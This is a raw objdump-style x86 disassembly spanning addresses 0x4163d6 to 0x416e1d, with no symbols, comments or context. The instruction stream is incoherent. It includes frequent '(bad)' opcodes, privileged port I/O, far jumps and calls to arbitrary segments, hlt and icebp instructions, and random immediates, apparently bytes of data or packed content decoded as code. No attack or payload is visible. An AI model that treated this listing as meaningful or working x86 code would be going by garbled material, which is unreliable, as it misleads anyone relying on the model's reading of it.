  4163d6:	cmp    BYTE PTR [ecx-0x1540b527],al
  4163dc:	std    
  4163dd:	cli    
  4163de:	inc    esi
  4163df:	add    eax,0x7927e69c
  4163e4:	dec    ebx
  4163e5:	xchg   esi,eax
  4163e6:	add    al,0xd8
  4163e8:	push   0xc01b4488
  4163ed:	mov    ecx,0x9bd2a7d8
  4163f2:	pop    ds
  4163f3:	js     0x41638a
  4163f5:	pop    edi
  4163f6:	cmp    ebp,DWORD PTR [ecx-0x3078ec66]
  4163fc:	fcom   DWORD PTR [edx-0x23]
  4163ff:	mov    al,0x92
  416401:	mov    ch,0x71
  416403:	and    ecx,DWORD PTR [ebp-0x15]
  416406:	jmp    0x143d:0x75fcc9bd
  41640d:	neg    cl
  41640f:	adc    bl,ah
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	inc    ebp
  416481:	es loopne 0x416434
  416484:	pop    ecx
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x56000001,al
  41648d:	push   edi
  41648e:	mov    edx,?
  416490:	outs   dx,DWORD PTR ds:[esi]
  416491:	mov    ch,0xe7
  416493:	sbb    dl,BYTE PTR [edx+0x7d]
  416496:	in     eax,dx
  416497:	iret   
  416498:	loop   0x416480
  41649a:	out    dx,al
  41649b:	xchg   BYTE PTR [ecx+0x63d0e2c9],bh
  4164a1:	(bad)  
  4164a2:	mov    ebp,0xdb8b64e1
  4164a7:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4164a9:	add    edx,esi
  4164ab:	daa    
  4164ac:	cmp    ah,BYTE PTR [edx-0x15]
  4164af:	dec    ebp
  4164b0:	bound  eax,QWORD PTR [esi-0x40]
  4164b3:	xchg   ebp,eax
  4164b4:	call   0xa53c:0xa2bbbd72
  4164bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164bc:	push   ebp
  4164bd:	jg     0x4164a9
  4164bf:	hlt    
  4164c0:	test   al,0xfe
  4164c2:	loopne 0x4164f8
  4164c4:	lods   eax,DWORD PTR ds:[esi]
  4164c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c6:	cmp    DWORD PTR [ecx],ecx
  4164c8:	outs   dx,BYTE PTR ds:[esi]
  4164c9:	jne    0x416485
  4164cb:	dec    edx
  4164cc:	push   ebp
  4164cd:	add    ebp,DWORD PTR [ecx+esi*1]
  4164d0:	mov    edx,DWORD PTR [ecx-0x322dec65]
  4164d6:	data16 icebp 
  4164d8:	stos   BYTE PTR es:[edi],al
  4164d9:	mov    ah,0x9f
  4164db:	pop    ebx
  4164dc:	hlt    
  4164dd:	pop    es
  4164de:	adc    al,0x3a
  4164e0:	push   es
  4164e1:	mov    ah,0xa4
  4164e3:	ins    BYTE PTR es:[edi],dx
  4164e4:	ror    edi,cl
  4164e6:	fcomp  DWORD PTR [edi]
  4164e8:	xchg   esi,eax
  4164e9:	adc    al,0xb9
  4164eb:	add    eax,ebp
  4164ed:	pop    esi
  4164ee:	mov    edi,0xc093f311
  4164f3:	or     BYTE PTR [ebx],0xd8
  4164f6:	mov    edi,0xf41caea9
  4164fb:	stc    
  4164fc:	outs   dx,BYTE PTR ds:[esi]
  4164fd:	sbb    eax,DWORD PTR [ebp-0x10]
  416500:	jbe    0x4164b7
  416502:	imul   esi,DWORD PTR [edi+eax*8],0x0
  416506:	pop    edx
  416507:	test   al,0x16
  416509:	push   ds
  41650a:	aas    
  41650b:	jno    0x416532
  41650d:	push   edx
  41650e:	mov    eax,fs
  416510:	cmp    ah,BYTE PTR [edx-0x489fc849]
  416516:	dec    ecx
  416517:	mov    WORD PTR [ecx+0x64],gs
  41651a:	pop    edx
  41651b:	frstor [eax]
  41651d:	mov    al,0xcb
  41651f:	cmp    edx,eax
  416521:	xchg   BYTE PTR [ebx-0x45],dh
  416524:	push   esi
  416525:	mov    bl,0xc1
  416527:	shl    eax,cl
  416529:	and    dl,bh
  41652b:	inc    ebp
  41652c:	push   ds
  41652d:	add    eax,ebx
  41652f:	imul   ebp,DWORD PTR [ebp-0x2ea5e857],0x2b
  416536:	or     al,0x52
  416538:	lahf   
  416539:	push   esi
  41653a:	pop    edx
  41653b:	cmc    
  41653c:	xor    BYTE PTR [edx+0x46],dl
  41653f:	jmp    0x416511
  416541:	scas   eax,DWORD PTR es:[edi]
  416542:	ins    DWORD PTR es:[edi],dx
  416543:	clc    
  416544:	test   BYTE PTR [eax+0x3c],dh
  416547:	(bad)  
  416548:	mul    al
  41654a:	push   ds
  41654b:	and    BYTE PTR [edx-0x4c],bl
  41654e:	lock ficomp WORD PTR [ecx-0x2c9719e3]
  416555:	int    0x88
  416557:	inc    esi
  416558:	xor    DWORD PTR [esp+ebx*2-0x71],ecx
  41655c:	js     0x4165ae
  41655e:	repz je 0x416596
  416561:	push   DWORD PTR [esi-0x770f9903]
  416567:	retf   
  416568:	or     al,0x51
  41656a:	jmp    0x9596:0xb3ba07b6
  416571:	pop    ebp
  416572:	lods   eax,DWORD PTR es:[esi]
  416574:	fwait
  416575:	clc    
  416576:	sub    DWORD PTR [edx+ecx*2+0x63849dda],edi
  41657d:	ins    DWORD PTR es:[edi],dx
  41657e:	sar    dh,1
  416580:	xchg   ebx,ebx
  416582:	adc    eax,0xfe1aa7be
  416587:	ins    BYTE PTR es:[edi],dx
  416588:	sbb    eax,0x528cf2ae
  41658d:	ss stos DWORD PTR es:[edi],eax
  41658f:	hlt    
  416590:	hlt    
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x7d4fbcac]
  416601:	fst    DWORD PTR [edx+0x3e]
  416604:	pop    esi
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0xcf000001
  41660d:	mov    dl,0xf5
  41660f:	push   es
  416610:	xor    eax,0xd1a27a9d
  416615:	out    dx,al
  416616:	jl     0x416614
  416618:	jmp    FWORD PTR [ebx+esi*4+0x12ebbdeb]
  41661f:	and    cl,dh
  416621:	fisub  DWORD PTR [edi+0x5a8989c4]
  416627:	jp     0x4165b1
  416629:	and    eax,0x5461bb3
  41662e:	add    ah,BYTE PTR [ecx+0x70]
  416631:	sbb    ebp,esi
  416633:	add    eax,0x63c7559a
  416638:	add    BYTE PTR [ecx-0x1a5e8653],ch
  41663e:	mov    edi,0x388f308c
  416643:	test   al,0xb7
  416645:	stc    
  416646:	or     eax,DWORD PTR [ecx+0x5debdbc5]
  41664c:	scas   eax,DWORD PTR es:[edi]
  41664d:	jmp    0x416685
  41664f:	inc    ebp
  416650:	pop    ebp
  416651:	test   DWORD PTR [eax-0x2f2d6324],ebp
  416657:	or     eax,0x9e118ae2
  41665c:	bound  eax,QWORD PTR [edi-0x62]
  41665f:	lahf   
  416660:	retf   0xe9af
  416663:	cli    
  416664:	push   esp
  416665:	pop    edx
  416666:	or     eax,0xd3e959fb
  41666b:	outs   dx,BYTE PTR ds:[esi]
  41666c:	test   eax,0x49747c1a
  416671:	mov    ah,0xbc
  416673:	out    dx,al
  416674:	add    edi,DWORD PTR cs:[ebx-0x6285309d]
  41667b:	add    eax,0xaafcb775
  416680:	cmp    eax,DWORD PTR [ecx]
  416682:	aam    0x52
  416684:	call   0xfeace57
  416689:	add    DWORD PTR [edx+ecx*4-0x10],esp
  41668d:	adc    ebp,esp
  41668f:	ficom  DWORD PTR [edx]
  416691:	mov    ebx,0x1e73d256
  416696:	xor    al,0xe0
  416698:	push   ds
  416699:	fstp   TBYTE PTR [eax+ecx*8]
  41669c:	fild   WORD PTR [edx]
  41669e:	dec    ebp
  41669f:	cli    
  4166a0:	jle    0x416650
  4166a2:	inc    ebx
  4166a3:	push   esp
  4166a4:	ret    
  4166a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166a6:	jmp    0x416724
  4166a8:	cdq    
  4166a9:	shr    DWORD PTR [edi-0x3cb5ccec],0xdc
  4166b0:	popa   
  4166b1:	push   edi
  4166b2:	(bad)  
  4166b3:	push   ss
  4166b4:	(bad)  
  4166b5:	sar    BYTE PTR [ecx-0x15],1
  4166b8:	in     al,0x7f
  4166ba:	out    0x54,eax
  4166bc:	es inc ebp
  4166be:	aad    0xe3
  4166c0:	out    0xb8,eax
  4166c2:	push   eax
  4166c3:	ins    BYTE PTR es:[edi],dx
  4166c4:	stos   BYTE PTR es:[edi],al
  4166c5:	ds aam 0x89
  4166c8:	imul   ebx,DWORD PTR [ebx+0x2f],0xfffffff9
  4166cc:	mov    ecx,0x864b1e00
  4166d1:	or     edx,DWORD PTR [esp]
  4166d4:	and    ecx,DWORD PTR ds:0x1e7b8666
  4166da:	mov    esp,DWORD PTR [edx+0x17]
  4166dd:	inc    ebx
  4166de:	or     dh,ah
  4166e0:	pop    edx
  4166e1:	cmp    al,0x1b
  4166e3:	enter  0x9eb4,0x9a
  4166e7:	test   al,0x92
  4166e9:	cwde   
  4166ea:	jg     0x4166d4
  4166ec:	pop    ecx
  4166ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ee:	neg    DWORD PTR [esi*8-0x41a2ec56]
  4166f5:	sbb    dl,BYTE PTR [eax-0x660e07fc]
  4166fb:	loope  0x41667f
  4166fd:	repnz aas 
  4166ff:	jo     0x4166d1
  416701:	ror    DWORD PTR [eax],1
  416703:	gs daa 
  416705:	bts    DWORD PTR [esi-0x6e],edi
  416709:	sbb    cl,BYTE PTR ss:[esi+ebx*8+0x76]
  41670e:	cwde   
  41670f:	mov    edi,0x42
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	loope  0x416721
  416782:	sbb    esp,edx
  416784:	arpl   bp,bp
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0xed000001
  41678d:	mov    ebx,0xc347921
  416792:	test   edi,esi
  416794:	or     eax,0xf4782bef
  416799:	rol    DWORD PTR [ebx+0x7d3aaabc],0xa5
  4167a0:	imul   ebx,DWORD PTR [ebx+edx*1],0xffffffc8
  4167a4:	daa    
  4167a5:	mov    ds:0x899d1a97,al
  4167aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ab:	mov    ah,0x21
  4167ad:	add    eax,0x6ac0d2d9
  4167b2:	fld    DWORD PTR [ecx]
  4167b4:	xor    eax,0x42196c43
  4167b9:	fmul   QWORD PTR [ebx-0x4f]
  4167bc:	sti    
  4167bd:	inc    esi
  4167be:	dec    ebp
  4167bf:	xor    edx,esp
  4167c1:	aaa    
  4167c2:	outs   dx,BYTE PTR ds:[esi]
  4167c3:	sahf   
  4167c4:	mov    al,0xb5
  4167c6:	sub    DWORD PTR [edi+0x58],eax
  4167c9:	push   0xffffffd1
  4167cb:	sub    ch,dl
  4167cd:	jg     0x416773
  4167cf:	mov    esi,0x3921ca5
  4167d5:	xor    al,dh
  4167d7:	mov    bh,0xa8
  4167d9:	ss aam 0x7f
  4167dc:	loopne 0x41682a
  4167de:	lahf   
  4167df:	jmp    DWORD PTR [ecx]
  4167e1:	or     DWORD PTR [eax-0x20],0x3
  4167e5:	test   eax,0xa1a364d7
  4167ea:	in     al,dx
  4167eb:	outs   dx,BYTE PTR ds:[esi]
  4167ec:	mov    edx,0x270fe3ff
  4167f1:	retf   
  4167f2:	jp     0x416833
  4167f4:	dec    ebp
  4167f5:	repnz aas 
  4167f7:	stos   DWORD PTR es:[edi],eax
  4167f8:	pop    edi
  4167f9:	mov    ss,WORD PTR [eax+edi*1-0x45]
  4167fd:	and    BYTE PTR [eax+0x40],ch
  416800:	mov    bl,bh
  416802:	mov    esp,0xdec7a2ac
  416807:	cmp    ebp,DWORD PTR [ebx-0x77]
  41680a:	xchg   ecx,eax
  41680b:	les    eax,FWORD PTR [edx]
  41680d:	out    0xf5,al
  41680f:	dec    ecx
  416810:	pop    esi
  416811:	sbb    dl,BYTE PTR [edi]
  416813:	out    dx,al
  416814:	or     eax,0x6f5a856b
  416819:	mov    BYTE PTR [ebx],dh
  41681b:	adc    al,0x7c
  41681d:	xchg   ebp,eax
  41681e:	sub    bl,BYTE PTR [ebx]
  416820:	out    0x65,eax
  416822:	mov    al,ds:0xca304968
  416827:	xchg   esp,eax
  416828:	push   0x56
  41682a:	outs   dx,DWORD PTR ds:[esi]
  41682b:	xchg   edi,eax
  41682c:	ret    
  41682d:	xchg   ecx,eax
  41682e:	daa    
  41682f:	and    al,0xc2
  416831:	ja     0x416869
  416833:	push   ss
  416834:	jb     0x4168a4
  416836:	fxch   st(4)
  416838:	ins    BYTE PTR es:[edi],dx
  416839:	(bad)  
  41683a:	scas   eax,DWORD PTR es:[edi]
  41683b:	pop    ss
  41683c:	fistp  DWORD PTR [ebp-0x54cd283]
  416842:	push   es
  416843:	add    bl,BYTE PTR [eax-0x10966aa9]
  416849:	jo     0x41684a
  41684b:	inc    di
  41684d:	fistp  DWORD PTR [ebx+eax*4]
  416850:	retf   
  416851:	sbb    al,0x86
  416853:	fcmovb st,st(2)
  416855:	shl    DWORD PTR [ebp+0x5f],1
  416858:	mov    ebx,DWORD PTR [edx]
  41685a:	mov    ds,WORD PTR [edi-0x4b58819b]
  416860:	in     al,0x63
  416862:	(bad)  
  416863:	int3   
  416864:	dec    eax
  416865:	cmp    ecx,DWORD PTR [edx-0x752233b5]
  41686b:	xchg   ebx,eax
  41686c:	je     0x41684f
  41686e:	enter  0x816d,0xac
  416872:	daa    
  416873:	test   al,0x2f
  416875:	jge    0x416882
  416877:	adc    bl,BYTE PTR [edi+0x108d0bf1]
  41687d:	mov    esi,ecx
  41687f:	xor    ecx,DWORD PTR [esi]
  416881:	adc    bl,dl
  416883:	fidivr WORD PTR [eax]
  416885:	or     eax,0xab1f75f4
  41688a:	push   ss
  41688b:	popa   
  41688c:	nop
  41688d:	adc    al,0x78
  41688f:	mov    ds:0x6c,eax
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x43d42423
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    cl,dl
  41690d:	shl    ebp,cl
  41690f:	popf   
  416910:	into   
  416911:	jb     0x4168df
  416913:	sub    eax,0x5426c1d7
  416918:	int3   
  416919:	(bad)  
  41691a:	push   esp
  41691b:	jbe    0x41697b
  41691d:	mov    edx,0xe55c0c7f
  416922:	pop    ebp
  416923:	in     eax,dx
  416924:	xchg   edi,eax
  416925:	call   0x2229:0xd6c8b3b1
  41692c:	(bad)  
  41692d:	mov    edx,0x3ad60515
  416932:	(bad)  
  416933:	mov    al,BYTE PTR [esi]
  416935:	xchg   edx,eax
  416936:	cmp    eax,0xb60d0a98
  41693b:	push   ebp
  41693c:	sahf   
  41693d:	and    DWORD PTR [esi+0x74a05fa4],0x35
  416944:	es cs ins BYTE PTR es:[edi],dx
  416947:	pop    eax
  416948:	cmp    eax,0xe6dfae27
  41694d:	aas    
  41694e:	mov    ds:0x8bd0871,eax
  416953:	jns    0x4168d8
  416955:	jne    0x4169d3
  416957:	ins    BYTE PTR es:[edi],dx
  416958:	mov    ecx,0x46e13f15
  41695d:	fcmovne st,st(3)
  41695f:	or     dh,dl
  416961:	cmp    eax,eax
  416963:	ror    BYTE PTR [ecx],cl
  416965:	cmp    BYTE PTR [ebp-0x54],al
  416968:	push   esp
  416969:	or     edx,DWORD PTR [eax+ecx*8]
  41696c:	xor    al,0xce
  41696e:	pop    edi
  41696f:	pop    esi
  416970:	call   0x7ea8:0xf0765849
  416977:	outs   dx,BYTE PTR ds:[esi]
  416978:	sbb    al,0xb1
  41697a:	ret    
  41697b:	dec    edi
  41697c:	loop   0x41697a
  41697e:	pop    ebx
  41697f:	mov    eax,ds:0x11a00897
  416984:	xor    edi,DWORD PTR [edx-0x258a79cb]
  41698a:	inc    edi
  41698b:	(bad)  
  41698c:	push   ebp
  41698d:	push   ecx
  41698e:	push   0x5a
  416990:	and    DWORD PTR [edi+0xb177cf2],0xfcfa6bba
  41699a:	call   0xc688dd88
  41699f:	mov    bh,0xef
  4169a1:	adc    BYTE PTR [eax-0x1c],0x8e
  4169a5:	dec    esp
  4169a6:	je     0x4169c3
  4169a8:	mov    eax,0x29317bdd
  4169ad:	mov    fs,WORD PTR [ecx+0x5836f6c2]
  4169b3:	rcl    DWORD PTR [esp+edi*8-0x2d],1
  4169b7:	jo     0x416939
  4169b9:	repnz bound ebx,QWORD PTR [edx]
  4169bc:	mov    ecx,0xb5a52e3c
  4169c1:	in     al,dx
  4169c2:	jne    0x416989
  4169c4:	or     DWORD PTR [ebp+0x27],0x177656cd
  4169cb:	in     al,0xe2
  4169cd:	xchg   DWORD PTR [ebx],eax
  4169cf:	mov    dh,0xfc
  4169d1:	imul   ebx,edi,0xffffffea
  4169d4:	pop    edx
  4169d5:	fnstenv [ebp+0x1217828d]
  4169db:	not    BYTE PTR [edx]
  4169dd:	mov    ds:0x5bdd3d35,al
  4169e2:	test   DWORD PTR [ebp-0x18],edx
  4169e5:	jne    0x416a41
  4169e7:	jns    0x416993
  4169e9:	ret    
  4169ea:	pop    ss
  4169eb:	fdivr  st,st(0)
  4169ed:	jp     0x4169c9
  4169ef:	xchg   DWORD PTR [edx],ecx
  4169f1:	fst    QWORD PTR [eax]
  4169f3:	sbb    BYTE PTR [edi+0x6de852f2],dh
  4169f9:	mov    WORD PTR [eax],gs
  4169fb:	out    0xd1,al
  4169fd:	rcr    dl,cl
  4169ff:	add    al,0x36
  416a01:	addr16 jmp 0x416a5e
  416a04:	ror    al,0x8a
  416a07:	fucomi st,st(2)
  416a09:	bswap  edi
  416a0b:	cmp    edi,DWORD PTR [eax+0x4d]
  416a0e:	leave  
  416a0f:	jbe    0x416a90
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x2ffe0ba3
  416a82:	hlt    
  416a83:	cmp    ebp,DWORD PTR [ebp-0x11]
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0xc8000001
  416a8d:	jne    0x416aea
  416a8f:	into   
  416a90:	pop    ss
  416a91:	fmul   QWORD PTR [ebp+0x29069c4f]
  416a97:	and    eax,0xff587220
  416a9c:	call   0x22b287f1
  416aa1:	ds xor al,0xec
  416aa4:	js     0x416a8f
  416aa6:	jne    0x416aae
  416aa8:	adc    esp,DWORD PTR [ebp+0x5d]
  416aab:	jns    0x416a64
  416aad:	fbstp  TBYTE PTR [edi+0x6e26301e]
  416ab3:	jnp    0x416a75
  416ab5:	push   cs
  416ab6:	add    dh,BYTE PTR [edi]
  416ab8:	mov    eax,ds:0x1d8cc020
  416abd:	xchg   ebp,eax
  416abe:	sub    al,0xb5
  416ac0:	cwde   
  416ac1:	push   0xffffffbc
  416ac3:	mov    eax,0x7e42574
  416ac8:	xchg   edi,eax
  416ac9:	mov    ch,0x9
  416acb:	rcl    BYTE PTR [edx],cl
  416acd:	dec    eax
  416ace:	icebp  
  416acf:	xchg   DWORD PTR [esi],ecx
  416ad1:	add    BYTE PTR ds:0xf49d4d01,0x8e
  416ad8:	pop    ecx
  416ad9:	sub    BYTE PTR [ecx+0x47],cl
  416adc:	sbb    edx,esi
  416ade:	push   es
  416adf:	dec    ebp
  416ae0:	lahf   
  416ae1:	sbb    al,0xa6
  416ae3:	pop    ecx
  416ae4:	sbb    eax,0xc458927d
  416ae9:	jns    0x416aa9
  416aeb:	std    
  416aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aed:	push   ss
  416aee:	jmp    0x238b920f
  416af3:	mov    ds:0x3d52451,al
  416af8:	or     ch,0xef
  416afb:	lahf   
  416afc:	into   
  416afd:	mov    fs,WORD PTR [ecx]
  416aff:	repnz pop ds
  416b01:	sub    al,0xd6
  416b03:	pop    ebp
  416b04:	jmp    0x635dc0c8
  416b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b0a:	(bad)  
  416b0b:	addr16 cmc 
  416b0d:	jl     0x416b76
  416b0f:	and    DWORD PTR [ebx],ecx
  416b11:	pop    ecx
  416b12:	xor    al,0x3d
  416b14:	lock or al,0xc4
  416b17:	or     al,0x5c
  416b19:	xchg   esp,eax
  416b1a:	cmp    ch,BYTE PTR [ecx]
  416b1c:	in     al,dx
  416b1d:	daa    
  416b1e:	cmc    
  416b1f:	leave  
  416b20:	ss aam 0xc1
  416b23:	out    0xc0,eax
  416b25:	inc    ebp
  416b26:	jge    0x416b2c
  416b28:	test   al,0xe9
  416b2a:	call   DWORD PTR [edi-0x1021e3e9]
  416b30:	jle    0x416b41
  416b32:	jle    0x416b43
  416b34:	std    
  416b35:	and    ah,BYTE PTR ds:0x690a9b
  416b3b:	xchg   edi,eax
  416b3c:	jns    0x416b17
  416b3e:	or     al,0xe8
  416b40:	mov    cl,BYTE PTR [ebp-0x58]
  416b43:	xor    al,0xf8
  416b45:	fcomp  DWORD PTR [esi]
  416b47:	and    al,0xff
  416b49:	inc    edi
  416b4a:	xchg   BYTE PTR [ecx+0x1a],dh
  416b4d:	cld    
  416b4e:	sbb    eax,0xb0c04800
  416b53:	add    DWORD PTR [ecx],edi
  416b55:	pusha  
  416b56:	or     ch,BYTE PTR cs:[edi-0x6363aa77]
  416b5d:	test   DWORD PTR [edi],edi
  416b5f:	les    esi,FWORD PTR [ebx+0x74b242fe]
  416b65:	icebp  
  416b66:	mov    WORD PTR [ecx],?
  416b68:	cmc    
  416b69:	nop
  416b6a:	pop    ds
  416b6b:	sbb    eax,0x624ce91a
  416b70:	xchg   esi,eax
  416b71:	mov    dl,0xfc
  416b73:	arpl   WORD PTR [esi],ax
  416b75:	icebp  
  416b76:	dec    BYTE PTR [eax+0x34ca0847]
  416b7c:	sbb    BYTE PTR [edx],dh
  416b7e:	hlt    
  416b7f:	repnz cmp dh,BYTE PTR [eax-0x36]
  416b83:	cmp    al,0xef
  416b85:	and    BYTE PTR [esi],0x36
  416b88:	or     BYTE PTR [edx],cl
  416b8a:	out    dx,al
  416b8b:	popa   
  416b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b8d:	mov    dl,0xf7
  416b8f:	(bad)  
  416b90:	repz add BYTE PTR [eax],al
	...
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x665b70a9
  416c01:	sub    BYTE PTR [edi-0x54],0x72
  416c05:	lock add BYTE PTR [eax],al
  416c08:	add    eax,0xcb000001
  416c0d:	adc    ebp,DWORD PTR [ebp-0x60]
  416c10:	dec    ecx
  416c11:	and    ebp,ebp
  416c13:	dec    edi
  416c14:	cwde   
  416c15:	dec    esp
  416c16:	xchg   edi,eax
  416c17:	push   ds
  416c18:	cld    
  416c19:	mov    ebx,0xd4bcf5dd
  416c1e:	pushf  
  416c1f:	cmp    ecx,DWORD PTR [edi+0x31]
  416c22:	add    DWORD PTR [edx],eax
  416c24:	repnz fwait
  416c26:	jno    0x416c65
  416c28:	enter  0x8339,0x62
  416c2c:	jno    0x416c3c
  416c2e:	or     ebp,DWORD PTR [ecx]
  416c30:	out    dx,al
  416c31:	test   eax,0xb64bde85
  416c36:	xchg   ebp,eax
  416c37:	and    eax,0x93e65cd8
  416c3c:	nop
  416c3d:	and    bh,bh
  416c3f:	pop    edi
  416c40:	mov    dl,0x4e
  416c42:	rcl    DWORD PTR [ecx],1
  416c44:	or     edx,DWORD PTR [eax+0x2]
  416c47:	iret   
  416c48:	(bad)
  416c4b:	xchg   DWORD PTR ds:0x96dc89ab,ebp
  416c51:	aad    0x26
  416c53:	push   0xffffffed
  416c55:	dec    ecx
  416c56:	aaa    
  416c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c58:	inc    ebx
  416c59:	hlt    
  416c5a:	leave  
  416c5b:	fistp  WORD PTR [ecx+edx*2]
  416c5e:	add    DWORD PTR [ebx+0x7],ebx
  416c61:	adc    BYTE PTR [edx],ch
  416c63:	nop
  416c64:	push   edi
  416c65:	out    0x91,al
  416c67:	sbb    bl,BYTE PTR [edi+0x5e]
  416c6a:	sub    BYTE PTR [esi+ebp*8+0x7f],0x73
  416c6f:	and    ecx,DWORD PTR [ebp+eax*2+0x479712f9]
  416c76:	bound  ecx,QWORD PTR [esi]
  416c78:	push   ds
  416c79:	jp     0x416cee
  416c7b:	add    al,0xb6
  416c7d:	outs   dx,BYTE PTR ds:[esi]
  416c7e:	nop
  416c7f:	dec    edi
  416c80:	dec    ecx
  416c81:	jnp    0x416cd1
  416c83:	inc    ebx
  416c84:	int3   
  416c85:	(bad)  
  416c87:	mov    ebp,0xb7197139
  416c8c:	add    DWORD PTR [edi+0x5a],edi
  416c8f:	js     0x416cf2
  416c91:	sub    DWORD PTR [edx+0x4ba6a2c2],eax
  416c97:	imul   edi,DWORD PTR [esp+edi*2-0x3e8f418f],0x1714d3bd
  416ca2:	sub    eax,0xf49cbfe9
  416ca7:	cmp    ebx,DWORD PTR [ebx]
  416ca9:	push   0x30
  416cab:	mov    dh,0x39
  416cad:	cmp    eax,0x30ded2e
  416cb2:	scas   eax,DWORD PTR es:[edi]
  416cb3:	push   0x63
  416cb5:	data16 mov dh,0x49
  416cb8:	dec    ebp
  416cb9:	mov    WORD PTR [esi-0x4fc6304e],cs
  416cbf:	and    eax,0x99cdcf87
  416cc4:	xchg   ebp,eax
  416cc5:	les    edx,FWORD PTR [ebp-0x6e]
  416cc8:	adc    ah,ah
  416cca:	pusha  
  416ccb:	mov    esi,0xb2d305f7
  416cd0:	cmp    bl,bh
  416cd2:	sbb    DWORD PTR [eax+0x3a],0xccb8ebbd
  416cd9:	mov    BYTE PTR [ecx+0x15],al
  416cdc:	js     0x416ced
  416cde:	pop    ebx
  416ce0:	jmp    0x45d:0x4e042aa5
  416ce7:	ficomp WORD PTR [ebp-0x5]
  416cea:	movlps QWORD PTR [edx+0x6b],xmm3
  416cee:	jnp    0x416d0f
  416cf0:	xchg   esp,eax
  416cf1:	or     DWORD PTR [esi+0x44],ecx
  416cf4:	int    0x33
  416cf6:	sbb    ebp,DWORD PTR [edx]
  416cf8:	sbb    ebx,DWORD PTR [eax+0xa92f9d4]
  416cfe:	mov    edi,0x9622a9f6
  416d04:	repz push cs
  416d06:	or     eax,0x656bb28b
  416d0b:	sbb    eax,0x41be3a97
  416d10:	mov    ebp,0x0
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	fsubr  QWORD PTR [ebx-0xe88d6dc]
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0x71000001
  416d8d:	jge    0x416dd3
  416d8f:	xchg   esp,eax
  416d90:	popa   
  416d91:	and    BYTE PTR [edi-0x7c],dh
  416d94:	sti    
  416d95:	mov    eax,0xaf18de9
  416d9a:	test   BYTE PTR [eax+0xb],dl
  416d9d:	ja     0x416d53
  416d9f:	shr    DWORD PTR [ebx-0x4e],1
  416da2:	leave  
  416da3:	in     eax,0x69
  416da5:	cdq    
  416da6:	(bad)  
  416da7:	jmp    0x416d76
  416da9:	pop    ds
  416daa:	push   ds
  416dab:	push   ebp
  416dac:	add    eax,0xdd33b519
  416db1:	in     eax,0x63
  416db3:	push   edx
  416db4:	jb     0x416dc5
  416db6:	cmp    dl,BYTE PTR [edx]
  416db8:	xchg   ebp,eax
  416db9:	and    al,0x57
  416dbb:	test   BYTE PTR [esi+0x5a],ch
  416dbe:	and    ecx,DWORD PTR [ebx]
  416dc0:	lock fwait
  416dc2:	or     eax,0xd09b8af
  416dc7:	in     eax,0xbb
  416dc9:	xchg   ecx,eax
  416dca:	pop    esp
  416dcb:	or     ebp,DWORD PTR [ecx+0x4141dd33]
  416dd1:	jecxz  0x416d66
  416dd3:	ins    BYTE PTR es:[edi],dx
  416dd4:	sti    
  416dd5:	call   0x1d6c:0x88437c4c
  416ddc:	adc    ebp,ebp
  416dde:	ficom  DWORD PTR [esi-0xd43737c]
  416de4:	inc    edx
  416de5:	popa   
  416de6:	lds    eax,FWORD PTR ds:[esi+ecx*2]
  416dea:	pop    edi
  416deb:	inc    ecx
  416dec:	add    ecx,DWORD PTR [esp+ebp*4]
  416def:	pop    es
  416df0:	out    0x4f,eax
  416df2:	test   BYTE PTR [esp+ebp*4-0x23],cl
  416df6:	xchg   ecx,eax
  416df7:	xchg   ecx,eax
  416df8:	pop    esi
  416df9:	and    al,0xae
  416dfb:	pop    esp
  416dfc:	or     DWORD PTR [ecx-0x23],edi
  416dff:	mov    ebp,0xca19673
  416e04:	jp     0x416d8c
  416e06:	icebp  
  416e07:	pop    edi
  416e08:	or     al,0x34
  416e0a:	aam    0x2d
  416e0c:	retf   0xb699
  416e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e10:	inc    ebp
  416e11:	sbb    BYTE PTR ds:0xf39d1ab9,ch
  416e17:	cmp    BYTE PTR [ecx-0x30fef714],dl
  416e1d:	repz sbb ecx,DWORD PTR ds:0x67b0b45d
